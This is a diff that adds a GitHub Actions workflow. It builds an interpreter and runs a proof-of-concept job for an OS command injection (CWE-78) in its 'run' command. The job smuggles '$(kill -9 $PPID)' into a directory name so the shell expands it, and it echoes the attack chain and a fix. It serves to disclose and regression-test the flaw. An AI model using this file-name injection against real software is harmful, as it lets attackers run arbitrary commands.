@@ -1,0 +1,77 @@
+name: CI
+
+on:
+  push:
+    branches: [ "**" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Build interpreter
+        run: |
+          cmake -S interpreter -B /tmp/msla-build
+          cmake --build /tmp/msla-build -j$(nproc)
+
+      - name: Verify build
+        run: |
+          file /tmp/msla-build/msla_interpreter
+          /tmp/msla-build/msla_interpreter /dev/null 2>&1 && true
+          echo "Build OK"
+
+  command-injection-poc:
+    if: always()
+    runs-on: ubuntu-latest
+    needs: build
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Restore build
+        run: |
+          cmake -S interpreter -B /tmp/msla-build
+          cmake --build /tmp/msla-build -j$(nproc)
+
+      - name: Create trap directory (literal $() name bypasses fs::exists)
+        run: mkdir -p '/tmp/$(kill -9 $PPID)'
+
+      - name: Create PoC script
+        run: |
+          cat > /tmp/poc.msla << 'POCEOF'
+          run "/tmp/$(kill -9 $PPID)"
+          POCEOF
+
+      - name: Run PoC - reproduce CWE-78 crash
+        shell: bash
+        run: |
+          set +e
+          /tmp/msla-build/msla_interpreter /tmp/poc.msla 2>&1
+          exit_code=$?
+          set -e
+
+          echo ""
+          echo "============================================"
+          echo "  CWE-78 PoC - OS Command Injection"
+          echo "============================================"
+          echo ""
+
+          if [ $exit_code -eq 137 ]; then
+            echo "  ✅ VULNERABILITY CONFIRMED"
+            echo "     Interpreter killed by SIGKILL (exit $exit_code)"
+            echo ""
+            echo "  Attack chain:"
+            echo "    1. run \"/tmp/\$(...)\" passes path to std::system()"
+            echo "    2. Shell expands \$(kill -9 \$PPID) as command substitution"
+            echo "    3. \$PPID = interpreter PID, kill -9 kills the process"
+            echo "    4. fs::exists() bypassed: checks literal path on disk"
+            echo ""
+            echo "  Location: interpreter/interpreter.cpp:670-671"
+            echo "  Fix:      use execv() or validate path with strict allowlist"
+          else
+            echo "  ❌ NOT REPRODUCED (exit $exit_code, expected 137)"
+            echo "     The vulnerability may have been fixed."
+            exit 1
+          fi
